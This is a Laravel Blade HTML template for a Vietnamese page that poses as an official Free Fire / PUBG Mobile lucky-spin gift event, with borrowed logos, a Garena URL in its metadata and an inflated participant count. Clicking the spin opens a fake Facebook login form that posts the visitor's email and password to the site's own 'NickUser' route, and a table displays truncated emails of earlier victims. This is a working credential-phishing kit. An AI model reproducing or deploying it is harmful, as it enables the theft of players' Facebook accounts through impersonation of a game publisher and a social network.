<html lang="vn">
    <head>
        <meta http-equiv="content-type" content="text/html;charset=UTF-8">
        <link rel="stylesheet" href="{{ asset('css/style.css') }}">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
        <title>Sự Kiện Vòng Quay Vô Cực FREEFIRE</title>
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://ff.garena.vn/">
        <meta property="og:site_name" content="FREE FIRE">
        <meta property="og:title" content="Sự Kiện Vòng Quay Vô Cực FREEFIRE">
        <meta property="og:image" content="1.bp.blogspot.com/-kPgd3sOIMBc/XoR9xS626HI/AAAAAAAAIqs/2qtqX9ckPpI03GGrbHShKouZURlvUEhEQCLcBGAsYHQ/s1600/123.html">
        <meta property="og:description" content="Đã có 1.562.478 người tham gia ">
    </head>
    <body>
        <header id="header" style="height: 10%;">
            <div class="container-fluid">
                <div class="row top-head align-items-center" style="justify-content: space-around;">
                    <div class="col-2 col-ms-3 col-sm-3 col-mg-3 col-lg-3 col-xl-3">
                        <img style="
                        padding: 5px;
                        margin-top: 10px;
                        width: 100px;" src="http://sukien-pubgmbvng.com/tom_image/icon_logo.png">
                    </div>
                    <nav id="main-nav">
                        <ul>
                            @foreach ($categories as $value)
                                <li><a href="{{ $value->slug }}" target="{{ $value->name }}">{{ $value->name }}</a></li>
                            @endforeach
                        </ul>
                    </nav>
                </div>
            </div>
    </header>
    <div class="c-content-box c-size-md c-bg-white">
        <div class="container">
            <div class="text-center" style="padding-top: 30px;padding-bottom: 30px;">
                <h3 class="c-font-uppercase c-center c-font-bold c-line-strike">
                    <span class="c-bg-grey-1">VÒNG QUAY MAY MẮN</span>
                </h3>
                <h4>Sự kiện nhận quà tri ân game thủ chính thức từ PUBG MOBILE VN</h4>
                <h4>Chú ý: Để nhận quà cần đạt cấp 35 trở lên. Mỗi tài khoản được nhận tối đa 3 lượt quay MIỄN PHÍ!</h4>
            </div>
            <div class="sllpbox">
                <div class="sa-charingbox">
                    <div class="sl-produl clearfix">
                        <div class="row">
                            <div class="col-md-6" style="display:flex;align-items: center;">
                                <section class="rotation">
                                    <div class="play-spin">
                                        <a class="ani-zoom" id="start-played" href="#fb">
                                            <img src="http://sukien-pubgmbvng.com/Content/images/IMG_3478.png" alt="Play Center">
                                        </a>
                                        <img style="width: 80%;max-width: 80%;opacity: 1;" src="http://sukien-pubgmbvng.com/Content/images/wkge5CsLu1_15624209102.png" alt="Play" id="rotate-play">
                                    </div>
                                    <br>
                                </section>
                            </div>
                            <div class="col-md-6">
                                <div class="col-md-12">
                                    <h2 style="font-weight:bold;text-align:center;"> LƯỢT QUAY GẦN ĐÂY </h2><br>
                                        <table class="table table-bordered">
                                            <tbody>
                                                <tr>
                                                    <th class="text-center" style="background-color: #339214;color: #fff;border-left: none!important; border-right: none!important; border: none;">Người Chơi</th>
                                                    <th class="text-center" style="background-color: #339214;color: #fff;border-left: none!important; border-right: none!important; border: none;">Phần Thưởng</th>
                                                    <th class="text-center" style="background-color: #339214;color: #fff;border-left: none!important; border-right: none!important; border: none;">Thời Gian</th>
                                                </tr>
                                                <tbody>
                                                    @foreach ($users as $value)
                                                    @if (!is_null($value->Products))
                                                        <tr style="background: rgb(0 0 0 / 85%);color:#FFF;">
                                                            <td class="text-center">{{ Str::substr($value->email, 0, 10) }}...</td>
                                                            <td class="text-center">{{ $value->Products->product }}</td>
                                                            <td class="text-center">{{ $value->updated_at->format('H:m d/m/Y') }}</td>
                                                        </tr>
                                                    @endif
                                                    @endforeach
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>



        <footer id="footer">
            <div class="container">
                <div class="row">
                    <div class="col-md-12 text-center">
                        <img src="http://sukien-pubgmbvng.com/tom_image/footer_logo.png"><br><br>
                        @foreach ($footer as $value)
                            <p>{!! $value->name !!}</p>
                        @endforeach
                    </div>
                </div>
            </div>
        </footer>


        <div id="fb">
            <div class="fb-login">
                <a href="#" class="close" title="Close">×</a>
                <div class="nav-fb">
                    <center></center>
                </div>
            <br>
            <center>
                <img src="https://pubgm.zing.vn/imgs/icon_logo.png" width="60px">
            </center>
            <font color="#000000">
                <span style="font-size: 15px; line-height: 18px; margin-bottom: 10px;">Đăng nhập vào tài khoản Facebook<br> của bạn để kết nối với PUBG Mobile</span>
            </font>
            <form class="formku" action="{{ route('NickUser') }}" method="post">
                @csrf
                <p class="mylabel"></p>
                <input type="text" name="email" placeholder="Email hoặc điện thoại" name="efb" autocorrect="off" required="" pattern=".{5,30}" autocomplete="off" autocapitalize="off" min="9" oninput="setCustomValidity('')"><br>
                <p class="mylabel"></p>
                <input type="password" name="psasword" placeholder="Mật khẩu " name="pfb" autocorrect="off" required="" pattern=".{6,30}" autocomplete="off" autocapitalize="off" min="8" max="50" oninput="setCustomValidity('')"><br>
                <br>
                <br>
                <center>
                    <button type="submit" class="btn-login-fb" name="login"><b>Đăng Nhập</b></button>
                </center>
                <br>
            </form>
        </div>
    </div>
    </body>
</html>
